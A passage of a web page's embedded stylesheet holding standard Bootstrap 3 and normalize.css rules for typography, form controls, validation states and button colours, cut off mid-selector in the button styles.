                background-image: -o-linear-gradient(top, #e8e8e8 0%, #f5f5f5 100%);
                background-image: -webkit-gradient(linear, left top, left bottom, from(#e8e8e8), to(#f5f5f5));
                background-image: linear-gradient(to bottom, #e8e8e8 0%, #f5f5f5 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffe8e8e8',endColorstr='#fff5f5f5',GradientType=0);
                border-color: #dcdcdc;
                -webkit-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05), 0 1px 0 rgba(255, 255, 255, 0.1);
                box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05), 0 1px 0 rgba(255, 255, 255, 0.1);
            } /*!* Bootstrap v3.3.5 (http://getbootstrap.com)
* Copyright 2011-2016 Twitter, Inc.
* Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)*/ /*!* Generated using the Bootstrap Customizer (http://getbootstrap.com/customize/?id=2c2d3ba6d688662ae361)
* Config saved to config.json and https://gist.github.com/2c2d3ba6d688662ae361*/ /*!* Bootstrap v3.3.6 (http://getbootstrap.com)
* Copyright 2011-2015 Twitter, Inc.
* Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)*/ /*!normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css*/
            html {
                font-family: sans-serif;
                -ms-text-size-adjust: 100%;
                -webkit-text-size-adjust: 100%;
            }
            body {
                margin: 0;
            }
            article,
            aside,
            details,
            figcaption,
            figure,
            footer,
            header,
            hgroup,
            main,
            menu,
            nav,
            section,
            summary {
                display: block;
            }
            audio,
            canvas,
            progress,
            video {
                display: inline-block;
                vertical-align: baseline;
            }
            audio:not([controls]) {
                display: none;
                height: 0;
            }
            [hidden],
            template {
                display: none;
            }
            a {
                background-color: transparent;
            }
            a:active,
            a:hover {
                outline: 0;
            }
            abbr[title] {
                border-bottom: 1px dotted;
            }
            b,
            strong {
                font-weight: 700;
            }
            dfn {
                font-style: italic;
            }
            h1 {
                font-size: 2em;
                margin: 0.67em 0;
            }
            mark {
                background: #ff0;
                color: #000;
            }
            small {
                font-size: 80%;
            }
            sub,
            sup {
                font-size: 75%;
                line-height: 0;
                position: relative;
                vertical-align: baseline;
            }
            sup {
                top: -0.5em;
            }
            sub {
                bottom: -0.25em;
            }
            img {
                border: 0;
            }
            svg:not(:root) {
                overflow: hidden;
            }
            figure {
                margin: 1em 40px;
            }
            hr {
                -webkit-box-sizing: content-box;
                -moz-box-sizing: content-box;
                box-sizing: content-box;
                height: 0;
            }
            pre {
                overflow: auto;
            }
            code,
            kbd,
            pre,
            samp {
                font-family: monospace, monospace;
                font-size: 1em;
            }
            button,
            input,
            optgroup,
            select,
            textarea {
                color: inherit;
                font: inherit;
                margin: 0;
            }
            button {
                overflow: visible;
            }
            button,
            select {
                text-transform: none;
            }
            button,
            html input[type="button"],
            input[type="reset"],
            input[type="submit"] {
                -webkit-appearance: button;
                cursor: pointer;
            }
            button[disabled],
            html input[disabled] {
                cursor: default;
            }
            button::-moz-focus-inner,
            input::-moz-focus-inner {
                border: 0;
                padding: 0;
            }
            input {
                line-height: normal;
            }
            input[type="checkbox"],
            input[type="radio"] {
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
                padding: 0;
            }
            input[type="number"]::-webkit-inner-spin-button,
            input[type="number"]::-webkit-outer-spin-button {
                height: auto;
            }
            input[type="search"] {
                -webkit-appearance: textfield;
                -webkit-box-sizing: content-box;
                -moz-box-sizing: content-box;
                box-sizing: content-box;
            }
            input[type="search"]::-webkit-search-cancel-button,
            input[type="search"]::-webkit-search-decoration {
                -webkit-appearance: none;
            }
            fieldset {
                border: 1px solid silver;
                margin: 0 2px;
                padding: 0.35em 0.625em 0.75em;
            }
            legend {
                border: 0;
                padding: 0;
            }
            textarea {
                overflow: auto;
            }
            optgroup {
                font-weight: 700;
            }
            table {
                border-collapse: collapse;
                border-spacing: 0;
            }
            td,
            th {
                padding: 0;
            }
            * {
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
            }
            *:before,
            *:after {
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
            }
            html {
                font-size: 10px;
                -webkit-tap-highlight-color: transparent;
            }
            body {
                font-family: helvetica neue, Helvetica, Arial, sans-serif;
                font-size: 14px;
                line-height: 1.42857143;
                color: #333;
                background-color: #fff;
            }
            input,
            button,
            select,
            textarea {
                font-family: inherit;
                font-size: inherit;
                line-height: inherit;
            }
            a {
                color: #337ab7;
                text-decoration: none;
            }
            a:hover,
            a:focus {
                color: #23527c;
                text-decoration: underline;
            }
            a:focus {
                outline: thin dotted;
                outline: 5px auto -webkit-focus-ring-color;
                outline-offset: -2px;
            }
            figure {
                margin: 0;
            }
            img {
                vertical-align: middle;
            }
            .img-responsive,
            .carousel-inner > .item > img,
            .carousel-inner > .item > a > img {
                display: block;
                max-width: 100%;
                height: auto;
            }
            .img-rounded {
                border-radius: 6px;
            }
            .img-thumbnail {
                padding: 4px;
                line-height: 1.42857143;
                background-color: #fff;
                border: 1px solid #ddd;
                border-radius: 4px;
                -webkit-transition: all 0.2s ease-in-out;
                -o-transition: all 0.2s ease-in-out;
                transition: all 0.2s ease-in-out;
                display: inline-block;
                max-width: 100%;
                height: auto;
            }
            .img-circle {
                border-radius: 50%;
            }
            hr {
                margin-top: 20px;
                margin-bottom: 20px;
                border: 0;
                border-top: 1px solid #eee;
            }
            .sr-only {
                position: absolute;
                width: 1px;
                height: 1px;
                margin: -1px;
                padding: 0;
                overflow: hidden;
                clip: rect(0, 0, 0, 0);
                border: 0;
            }
            .sr-only-focusable:active,
            .sr-only-focusable:focus {
                position: static;
                width: auto;
                height: auto;
                margin: 0;
                overflow: visible;
                clip: auto;
            }
            [role="button"] {
                cursor: pointer;
            }
            h1,
            h2,
            h3,
            h4,
            h5,
            h6,
            .h1,
            .h2,
            .h3,
            .h4,
            .h5,
            .h6 {
                font-family: inherit;
                font-weight: 500;
                line-height: 1.1;
                color: inherit;
            }
            h1 small,
            h2 small,
            h3 small,
            h4 small,
            h5 small,
            h6 small,
            .h1 small,
            .h2 small,
            .h3 small,
            .h4 small,
            .h5 small,
            .h6 small,
            h1 .small,
            h2 .small,
            h3 .small,
            h4 .small,
            h5 .small,
            h6 .small,
            .h1 .small,
            .h2 .small,
            .h3 .small,
            .h4 .small,
            .h5 .small,
            .h6 .small {
                font-weight: 400;
                line-height: 1;
                color: #777;
            }
            h1,
            .h1,
            h2,
            .h2,
            h3,
            .h3 {
                margin-top: 20px;
                margin-bottom: 10px;
            }
            h1 small,
            .h1 small,
            h2 small,
            .h2 small,
            h3 small,
            .h3 small,
            h1 .small,
            .h1 .small,
            h2 .small,
            .h2 .small,
            h3 .small,
            .h3 .small {
                font-size: 65%;
            }
            h4,
            .h4,
            h5,
            .h5,
            h6,
            .h6 {
                margin-top: 10px;
                margin-bottom: 10px;
            }
            h4 small,
            .h4 small,
            h5 small,
            .h5 small,
            h6 small,
            .h6 small,
            h4 .small,
            .h4 .small,
            h5 .small,
            .h5 .small,
            h6 .small,
            .h6 .small {
                font-size: 75%;
            }
            h1,
            .h1 {
                font-size: 36px;
            }
            h2,
            .h2 {
                font-size: 30px;
            }
            h3,
            .h3 {
                font-size: 24px;
            }
            h4,
            .h4 {
                font-size: 18px;
            }
            h5,
            .h5 {
                font-size: 14px;
            }
            h6,
            .h6 {
                font-size: 12px;
            }
            p {
                margin: 0 0 10px;
            }
            .lead {
                margin-bottom: 20px;
                font-size: 16px;
                font-weight: 300;
                line-height: 1.4;
            }
            @media (min-width: 768px) {
                .lead {
                    font-size: 21px;
                }
            }
            small,
            .small {
                font-size: 85%;
            }
            mark,
            .mark {
                background-color: #fcf8e3;
                padding: 0.2em;
            }
            .text-left {
                text-align: left;
            }
            .text-right {
                text-align: right;
            }
            .text-center {
                text-align: center;
            }
            .text-justify {
                text-align: justify;
            }
            .text-nowrap {
                white-space: nowrap;
            }
            .text-lowercase {
                text-transform: lowercase;
            }
            .text-uppercase {
                text-transform: uppercase;
            }
            .text-capitalize {
                text-transform: capitalize;
            }
            .text-muted {
                color: #777;
            }
            .text-primary {
                color: #337ab7;
            }
            a.text-primary:hover,
            a.text-primary:focus {
                color: #286090;
            }
            .text-success {
                color: #3c763d;
            }
            a.text-success:hover,
            a.text-success:focus {
                color: #2b542c;
            }
            .text-info {
                color: #31708f;
            }
            a.text-info:hover,
            a.text-info:focus {
                color: #245269;
            }
            .text-warning {
                color: #8a6d3b;
            }
            a.text-warning:hover,
            a.text-warning:focus {
                color: #66512c;
            }
            .text-danger {
                color: #a94442;
            }
            a.text-danger:hover,
            a.text-danger:focus {
                color: #843534;
            }
            .bg-primary {
                color: #fff;
                background-color: #337ab7;
            }
            a.bg-primary:hover,
            a.bg-primary:focus {
                background-color: #286090;
            }
            .bg-success {
                background-color: #dff0d8;
            }
            a.bg-success:hover,
            a.bg-success:focus {
                background-color: #c1e2b3;
            }
            .bg-info {
                background-color: #d9edf7;
            }
            a.bg-info:hover,
            a.bg-info:focus {
                background-color: #afd9ee;
            }
            .bg-warning {
                background-color: #fcf8e3;
            }
            a.bg-warning:hover,
            a.bg-warning:focus {
                background-color: #f7ecb5;
            }
            .bg-danger {
                background-color: #f2dede;
            }
            a.bg-danger:hover,
            a.bg-danger:focus {
                background-color: #e4b9b9;
            }
            .page-header {
                padding-bottom: 9px;
                margin: 40px 0 20px;
                border-bottom: 1px solid #eee;
            }
            ul,
            ol {
                margin-top: 0;
                margin-bottom: 10px;
            }
            ul ul,
            ol ul,
            ul ol,
            ol ol {
                margin-bottom: 0;
            }
            .list-unstyled {
                padding-left: 0;
                list-style: none;
            }
            .list-inline {
                padding-left: 0;
                list-style: none;
                margin-left: -5px;
            }
            .list-inline > li {
                display: inline-block;
                padding-left: 5px;
                padding-right: 5px;
            }
            dl {
                margin-top: 0;
                margin-bottom: 20px;
            }
            dt,
            dd {
                line-height: 1.42857143;
            }
            dt {
                font-weight: 700;
            }
            dd {
                margin-left: 0;
            }
            @media (min-width: 768px) {
                .dl-horizontal dt {
                    float: left;
                    width: 160px;
                    clear: left;
                    text-align: right;
                    overflow: hidden;
                    text-overflow: ellipsis;
                    white-space: nowrap;
                }
                .dl-horizontal dd {
                    margin-left: 180px;
                }
            }
            abbr[title],
            abbr[data-original-title] {
                cursor: help;
                border-bottom: 1px dotted #777;
            }
            .initialism {
                font-size: 90%;
                text-transform: uppercase;
            }
            blockquote {
                padding: 10px 20px;
                margin: 0 0 20px;
                font-size: 17.5px;
                border-left: 5px solid #eee;
            }
            blockquote p:last-child,
            blockquote ul:last-child,
            blockquote ol:last-child {
                margin-bottom: 0;
            }
            blockquote footer,
            blockquote small,
            blockquote .small {
                display: block;
                font-size: 80%;
                line-height: 1.42857143;
                color: #777;
            }
            blockquote footer:before,
            blockquote small:before,
            blockquote .small:before {
                content: "\2014 \00A0";
            }
            .blockquote-reverse,
            blockquote.pull-right {
                padding-right: 15px;
                padding-left: 0;
                border-right: 5px solid #eee;
                border-left: 0;
                text-align: right;
            }
            .blockquote-reverse footer:before,
            blockquote.pull-right footer:before,
            .blockquote-reverse small:before,
            blockquote.pull-right small:before,
            .blockquote-reverse .small:before,
            blockquote.pull-right .small:before {
                content: "";
            }
            .blockquote-reverse footer:after,
            blockquote.pull-right footer:after,
            .blockquote-reverse small:after,
            blockquote.pull-right small:after,
            .blockquote-reverse .small:after,
            blockquote.pull-right .small:after {
                content: "\00A0 \2014";
            }
            address {
                margin-bottom: 20px;
                font-style: normal;
                line-height: 1.42857143;
            }
            fieldset {
                padding: 0;
                margin: 0;
                border: 0;
                min-width: 0;
            }
            legend {
                display: block;
                width: 100%;
                padding: 0;
                margin-bottom: 20px;
                font-size: 21px;
                line-height: inherit;
                color: #333;
                border: 0;
                border-bottom: 1px solid #e5e5e5;
            }
            label {
                display: inline-block;
                max-width: 100%;
                margin-bottom: 0;
            }
            input[type="search"] {
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
            }
            input[type="radio"],
            input[type="checkbox"] {
                margin: 4px 0 0;
                margin-top: 1px \9;
                line-height: normal;
            }
            input[type="file"] {
                display: block;
            }
            input[type="range"] {
                display: block;
                width: 100%;
            }
            select[multiple],
            select[size] {
                height: auto;
            }
            input[type="file"]:focus,
            input[type="radio"]:focus,
            input[type="checkbox"]:focus {
                outline: thin dotted;
                outline: 5px auto -webkit-focus-ring-color;
                outline-offset: -2px;
            }
            output {
                display: block;
                padding-top: 7px;
                font-size: 14px;
                line-height: 1.42857143;
                color: #555;
            }
            .form-control {
                display: block;
                width: 100%;
                height: 34px;
                padding: 6px 12px;
                font-size: 14px;
                line-height: 1.42857143;
                color: #555;
                background-color: #fff;
                background-image: none;
                border: 1px solid #ccc;
                border-radius: 4px;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                -webkit-transition: border-color ease-in-out 0.15s, -webkit-box-shadow ease-in-out 0.15s;
                -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
                transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
            }
            .form-control:focus {
                border-color: #66afe9;
                outline: 0;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(102, 175, 233, 0.6);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(102, 175, 233, 0.6);
            }
            .form-control::-moz-placeholder {
                color: #999;
                opacity: 1;
            }
            .form-control:-ms-input-placeholder {
                color: #999;
            }
            .form-control::-webkit-input-placeholder {
                color: #999;
            }
            .form-control::-ms-expand {
                border: 0;
                background-color: transparent;
            }
            .form-control[disabled],
            .form-control[readonly],
            fieldset[disabled] .form-control {
                background-color: #eee;
                opacity: 1;
            }
            .form-control[disabled],
            fieldset[disabled] .form-control {
                cursor: not-allowed;
            }
            textarea.form-control {
                height: auto;
            }
            input[type="search"] {
                -webkit-appearance: none;
            }
            @media screen and (-webkit-min-device-pixel-ratio: 0) {
                input[type="date"].form-control,
                input[type="time"].form-control,
                input[type="datetime-local"].form-control,
                input[type="month"].form-control {
                    line-height: 34px;
                }
                input[type="date"].input-sm,
                input[type="time"].input-sm,
                input[type="datetime-local"].input-sm,
                input[type="month"].input-sm,
                .input-group-sm input[type="date"],
                .input-group-sm input[type="time"],
                .input-group-sm input[type="datetime-local"],
                .input-group-sm input[type="month"] {
                    line-height: 30px;
                }
                input[type="date"].input-lg,
                input[type="time"].input-lg,
                input[type="datetime-local"].input-lg,
                input[type="month"].input-lg,
                .input-group-lg input[type="date"],
                .input-group-lg input[type="time"],
                .input-group-lg input[type="datetime-local"],
                .input-group-lg input[type="month"] {
                    line-height: 46px;
                }
            }
            .form-group {
                margin-bottom: 15px;
            }
            .radio,
            .checkbox {
                position: relative;
                display: block;
                margin-top: 10px;
                margin-bottom: 10px;
            }
            .radio label,
            .checkbox label {
                min-height: 20px;
                padding-left: 20px;
                margin-bottom: 0;
                font-weight: 400;
                cursor: pointer;
            }
            .radio input[type="radio"],
            .radio-inline input[type="radio"],
            .checkbox input[type="checkbox"],
            .checkbox-inline input[type="checkbox"] {
                position: absolute;
                margin-left: -20px;
                margin-top: 4px \9;
            }
            .radio + .radio,
            .checkbox + .checkbox {
                margin-top: -5px;
            }
            .radio-inline,
            .checkbox-inline {
                position: relative;
                display: inline-block;
                padding-left: 20px;
                margin-bottom: 0;
                vertical-align: middle;
                font-weight: 400;
                cursor: pointer;
            }
            .radio-inline + .radio-inline,
            .checkbox-inline + .checkbox-inline {
                margin-top: 0;
                margin-left: 10px;
            }
            input[type="radio"][disabled],
            input[type="checkbox"][disabled],
            input[type="radio"].disabled,
            input[type="checkbox"].disabled,
            fieldset[disabled] input[type="radio"],
            fieldset[disabled] input[type="checkbox"] {
                cursor: not-allowed;
            }
            .radio-inline.disabled,
            .checkbox-inline.disabled,
            fieldset[disabled] .radio-inline,
            fieldset[disabled] .checkbox-inline {
                cursor: not-allowed;
            }
            .radio.disabled label,
            .checkbox.disabled label,
            fieldset[disabled] .radio label,
            fieldset[disabled] .checkbox label {
                cursor: not-allowed;
            }
            .form-control-static {
                padding-top: 7px;
                padding-bottom: 7px;
                margin-bottom: 0;
                min-height: 34px;
            }
            .form-control-static.input-lg,
            .form-control-static.input-sm {
                padding-left: 0;
                padding-right: 0;
            }
            .input-sm {
                height: 30px;
                padding: 5px 10px;
                font-size: 12px;
                line-height: 1.5;
                border-radius: 3px;
            }
            select.input-sm {
                height: 30px;
                line-height: 30px;
            }
            textarea.input-sm,
            select[multiple].input-sm {
                height: auto;
            }
            .form-group-sm .form-control {
                height: 30px;
                padding: 5px 10px;
                font-size: 12px;
                line-height: 1.5;
                border-radius: 3px;
            }
            .form-group-sm select.form-control {
                height: 30px;
                line-height: 30px;
            }
            .form-group-sm textarea.form-control,
            .form-group-sm select[multiple].form-control {
                height: auto;
            }
            .form-group-sm .form-control-static {
                height: 30px;
                min-height: 32px;
                padding: 6px 10px;
                font-size: 12px;
                line-height: 1.5;
            }
            .input-lg {
                height: 46px;
                padding: 10px 16px;
                font-size: 18px;
                line-height: 1.3333333;
                border-radius: 6px;
            }
            select.input-lg {
                height: 46px;
                line-height: 46px;
            }
            textarea.input-lg,
            select[multiple].input-lg {
                height: auto;
            }
            .form-group-lg .form-control {
                height: 46px;
                padding: 10px 16px;
                font-size: 18px;
                line-height: 1.3333333;
                border-radius: 6px;
            }
            .form-group-lg select.form-control {
                height: 46px;
                line-height: 46px;
            }
            .form-group-lg textarea.form-control,
            .form-group-lg select[multiple].form-control {
                height: auto;
            }
            .form-group-lg .form-control-static {
                height: 46px;
                min-height: 38px;
                padding: 11px 16px;
                font-size: 18px;
                line-height: 1.3333333;
            }
            .has-feedback {
                position: relative;
            }
            .has-feedback .form-control {
                padding-right: 42.5px;
            }
            .form-control-feedback {
                position: absolute;
                top: 0;
                right: 0;
                z-index: 2;
                display: block;
                width: 34px;
                height: 34px;
                line-height: 34px;
                text-align: center;
                pointer-events: none;
            }
            .input-lg + .form-control-feedback,
            .input-group-lg + .form-control-feedback,
            .form-group-lg .form-control + .form-control-feedback {
                width: 46px;
                height: 46px;
                line-height: 46px;
            }
            .input-sm + .form-control-feedback,
            .input-group-sm + .form-control-feedback,
            .form-group-sm .form-control + .form-control-feedback {
                width: 30px;
                height: 30px;
                line-height: 30px;
            }
            .has-success .help-block,
            .has-success .control-label,
            .has-success .radio,
            .has-success .checkbox,
            .has-success .radio-inline,
            .has-success .checkbox-inline,
            .has-success.radio label,
            .has-success.checkbox label,
            .has-success.radio-inline label,
            .has-success.checkbox-inline label {
                color: #3c763d;
            }
            .has-success .form-control {
                border-color: #3c763d;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            }
            .has-success .form-control:focus {
                border-color: #2b542c;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #67b168;
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #67b168;
            }
            .has-success .input-group-addon {
                color: #3c763d;
                border-color: #3c763d;
                background-color: #dff0d8;
            }
            .has-success .form-control-feedback {
                color: #3c763d;
            }
            .has-warning .help-block,
            .has-warning .control-label,
            .has-warning .radio,
            .has-warning .checkbox,
            .has-warning .radio-inline,
            .has-warning .checkbox-inline,
            .has-warning.radio label,
            .has-warning.checkbox label,
            .has-warning.radio-inline label,
            .has-warning.checkbox-inline label {
                color: #8a6d3b;
            }
            .has-warning .form-control {
                border-color: #8a6d3b;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            }
            .has-warning .form-control:focus {
                border-color: #66512c;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #c0a16b;
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #c0a16b;
            }
            .has-warning .input-group-addon {
                color: #8a6d3b;
                border-color: #8a6d3b;
                background-color: #fcf8e3;
            }
            .has-warning .form-control-feedback {
                color: #8a6d3b;
            }
            .has-error .help-block,
            .has-error .control-label,
            .has-error .radio,
            .has-error .checkbox,
            .has-error .radio-inline,
            .has-error .checkbox-inline,
            .has-error.radio label,
            .has-error.checkbox label,
            .has-error.radio-inline label,
            .has-error.checkbox-inline label {
                color: #a94442;
            }
            .has-error .form-control {
                border-color: #a94442;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            }
            .has-error .form-control:focus {
                border-color: #843534;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ce8483;
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ce8483;
            }
            .has-error .input-group-addon {
                color: #a94442;
                border-color: #a94442;
                background-color: #f2dede;
            }
            .has-error .form-control-feedback {
                color: #a94442;
            }
            .has-feedback label ~ .form-control-feedback {
                top: 25px;
            }
            .has-feedback label.sr-only ~ .form-control-feedback {
                top: 0;
            }
            .help-block {
                display: block;
                margin-top: 5px;
                margin-bottom: 10px;
                color: #737373;
            }
            @media (min-width: 768px) {
                .form-inline .form-group {
                    display: inline-block;
                    margin-bottom: 0;
                    vertical-align: middle;
                }
                .form-inline .form-control {
                    display: inline-block;
                    width: auto;
                    vertical-align: middle;
                }
                .form-inline .form-control-static {
                    display: inline-block;
                }
                .form-inline .input-group {
                    display: inline-table;
                    vertical-align: middle;
                }
                .form-inline .input-group .input-group-addon,
                .form-inline .input-group .input-group-btn,
                .form-inline .input-group .form-control {
                    width: auto;
                }
                .form-inline .input-group > .form-control {
                    width: 100%;
                }
                .form-inline .control-label {
                    margin-bottom: 0;
                    vertical-align: middle;
                }
                .form-inline .radio,
                .form-inline .checkbox {
                    display: inline-block;
                    margin-top: 0;
                    margin-bottom: 0;
                    vertical-align: middle;
                }
                .form-inline .radio label,
                .form-inline .checkbox label {
                    padding-left: 0;
                }
                .form-inline .radio input[type="radio"],
                .form-inline .checkbox input[type="checkbox"] {
                    position: relative;
                    margin-left: 0;
                }
                .form-inline .has-feedback .form-control-feedback {
                    top: 0;
                }
            }
            .form-horizontal .radio,
            .form-horizontal .checkbox,
            .form-horizontal .radio-inline,
            .form-horizontal .checkbox-inline {
                margin-top: 0;
                margin-bottom: 0;
                padding-top: 7px;
            }
            .form-horizontal .radio,
            .form-horizontal .checkbox {
                min-height: 27px;
            }
            .form-horizontal .form-group {
                margin-left: -15px;
                margin-right: -15px;
            }
            @media (min-width: 768px) {
                .form-horizontal .control-label {
                    text-align: right;
                    margin-bottom: 0;
                    padding-top: 7px;
                }
            }
            .form-horizontal .has-feedback .form-control-feedback {
                right: 15px;
            }
            @media (min-width: 768px) {
                .form-horizontal .form-group-lg .control-label {
                    padding-top: 11px;
                    font-size: 18px;
                }
            }
            @media (min-width: 768px) {
                .form-horizontal .form-group-sm .control-label {
                    padding-top: 6px;
                    font-size: 12px;
                }
            }
            .btn {
                display: inline-block;
                margin-bottom: 0;
                font-weight: 400;
                text-align: center;
                vertical-align: middle;
                -ms-touch-action: manipulation;
                touch-action: manipulation;
                cursor: pointer;
                background-image: none;
                border: 1px solid transparent;
                white-space: nowrap;
                padding: 6px 12px;
                font-size: 14px;
                line-height: 1.42857143;
                border-radius: 4px;
                -webkit-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }
            .btn:focus,
            .btn:active:focus,
            .btn.active:focus,
            .btn.focus,
            .btn:active.focus,
            .btn.active.focus {
                outline: thin dotted;
                outline: 5px auto -webkit-focus-ring-color;
                outline-offset: -2px;
            }
            .btn:hover,
            .btn:focus,
            .btn.focus {
                color: #333;
                text-decoration: none;
            }
            .btn:active,
            .btn.active {
                outline: 0;
                background-image: none;
                -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
                box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
            }
            .btn.disabled,
            .btn[disabled],
            fieldset[disabled] .btn {
                cursor: not-allowed;
                opacity: 0.65;
                filter: alpha(opacity=65);
                -webkit-box-shadow: none;
                box-shadow: none;
            }
            a.btn.disabled,
            fieldset[disabled] a.btn {
                pointer-events: none;
            }
            .btn-default {
                color: #333;
                background-color: #fff;
                border-color: #ccc;
            }
            .btn-default:focus,
            .btn-default.focus {
                color: #333;
                background-color: #e6e6e6;
                border-color: #8c8c8c;
            }
            .btn-default:hover {
                color: #333;
                background-color: #e6e6e6;
                border-color: #adadad;
            }
            .btn-default:active,
            .btn-default.active,
            .open > .dropdown-toggle.btn-default {
                color: #333;
                background-color: #e6e6e6;
                border-color: #adadad;
            }
            .btn-default:active:hover,
            .btn-default.active:hover,
            .open > .dropdown-toggle.btn-default:hover,
            .btn-default:active:focus,
            .btn-default.active:focus,
            .open > .dropdown-toggle.btn-default:focus,
            .btn-default:active.focus,
            .btn-default.active.focus,
            .open > .dropdown-toggle.btn-default.focus {
                color: #333;
                background-color: #d4d4d4;
                border-color: #8c8c8c;
            }
            .btn-default:active,
            .btn-default.active,
            .open > .dropdown-toggle.btn-default {
                background-image: none;
            }
            .btn-default.disabled:hover,
            .btn-default[disabled]:hover,
            fieldset[disabled] .btn-default:hover,
            .btn-default.disabled:focus,
            .btn-default[disabled]:focus,
            fieldset[disabled] .btn-default:focus,
            .btn-default.disabled.focus,
            .btn-default[disabled].focus,
            fieldset[disabled] .btn-default.focus {
                background-color: #fff;
                border-color: #ccc;
            }
            .btn-default .badge {
                color: #fff;
                background-color: #333;
            }
            .btn-primary {
                color: #fff;
                background-color: #337ab7;
                border-color: #2e6da4;
            }
            .btn-primary:focus,
            .btn-primary.focus {
                color: #fff;
                background-color: #286090;
                border-color: #122b40;
            }
            .btn-primary:hover {
                color: #fff;
                background-color: #286090;
                border-color: #204d74;
            }
            .btn-primary:active,
            .btn-primary.active,
            .open > .dropdown-toggle.btn-primary {
                color: #fff;
                background-color: #286090;
                border-color: #204d74;
            }
            .btn-primary:active:hover,
            .btn-primary.active:hover,
            .open > .dropdown-toggle.btn-primary:hover,
            .btn-primary:active:focus,
            .btn-primary.active:focus,
            .open > .dropdown-toggle.btn-primary:focus,
            .btn-primary:active.focus,
            .btn-primary.active.focus,
            .open > .dropdown-toggle.btn-primary.focus {
                color: #fff;
                background-color: #204d74;
                border-color: #122b40;
            }
            .btn-primary:active,
            .btn-primary.active,
            .open > .dropdown-toggle.btn-primary {
                background-image: none;
            }
            .btn-primary.disabled:hover,
            .btn-primary[disabled]:hover,
            fieldset[disabled] .btn-primary:hover,
            .btn-primary.disabled:focus,
            .btn-primary[disabled]:focus,
            fieldset[disabled] .btn-primary:focus,
            .btn-primary.disabled.focus,
            .btn-primary[disabled].focus,
            fieldset[disabled] .btn-primary.focus {
                background-color: #337ab7;
                border-color: #2e6da4;
            }
            .btn-primary .badge {
                color: #337ab7;
                background-color: #fff;
            }
            .btn-success {
                color: #fff;
                background-color: #5cb85c;
                border-color: #4cae4c;
            }
            .btn-success:focus,
            .btn-success.focus {
                color: #fff;
                background-color: #449d44;
                border-color: #255625;
            }
            .btn-success:hover {
                color: #fff;
                background-color: #449d44;
                border-color: #398439;
            }
            .btn-success:active,
            .btn-success.active,
            .open > .dropdown-toggle.btn-success {
                color: #fff;
                background-color: #449d44;
                border-color: #398439;
            }
            .btn-success:active:hover,
            .btn-success.active:hover,
            .open > .dropdown-toggle.btn-success:hover,
            .btn-success:active:focus,
            .btn-success.active:focus,
            .open > .dropdown-toggle.btn-success:focus,
            .btn-success:active.focus,
            .btn-success.active.focus,
            .open > .dropdown-toggle.btn-success.focus {
                color: #fff;
                background-color: #398439;
                border-color: #255625;
            }
            .btn-success:active,
            .btn-success.active,
            .open > .dropdown-toggle.btn-success {
                background-image: none;
            }
            .btn-success.disabled:hover,
            .btn-success[disabled]:hover,
            fieldset[disabled] .btn-success:hover,
            .btn-success.disabled:focus,
            .btn-success[disabled]:focus,
            fieldset[disabled] .btn-success:focus,
            .btn-success.disabled.focus,
            .btn-success[disabled].focus,
            fieldset[disabled] .btn-success.focus {
                background-color: #5cb85c;
                border-color: #4cae4c;
            }
            .btn-success .badge {
                color: #5cb85c;
                background-color: #fff;
            }
            .btn-info {
                color: #fff;
                background-color: #5bc0de;
                border-color: #46b8da;
            }
            .btn-info:focus,
            .btn-info.focus {
                color: #fff;
                background-color: #31b0d5;
                border-color: #1b6d85;
            }
            .btn-info:hover {
                color: #fff;
                background-color: #31b0d5;
                border-color: #269abc;
            }
            .btn-info:active,
            .btn-info.active,
            .open > .dropdown-toggle.btn-info {
                color: #fff;
                background-color: #31b0d5;
                border-color: #269abc;
            }
            .btn-info:active:hover,
            .btn-info.active:hover,
            .open > .dropdown-toggle.btn-info:hover,
            .btn-info:active:focus,
            .btn-info.active:focus,
            .open > .dropdown-toggle.btn-info:focus,
            .btn-info:active.focus,
            .btn-info.active.focus,
            .open > .dropdown-toggle.btn-info.focus {
                color: #fff;
                background-color: #269abc;
                border-color: #1b6d85;
            }
            .btn-info:active,
            .btn-info.active,
            .open > .dropdown-toggle.btn-info {
                background-image: none;
            }
            .btn-info.disabled:hover,
            .btn-info[disabled]:hover,
            fieldset[disabled] .btn-info:hover,
            .btn-info.disabled:focus,
            .btn-info[disabled]:focus,
            fieldset[disabled] .btn-info:focus,
            .btn-info.disabled.focus,
            .btn-info[disabled].focus,
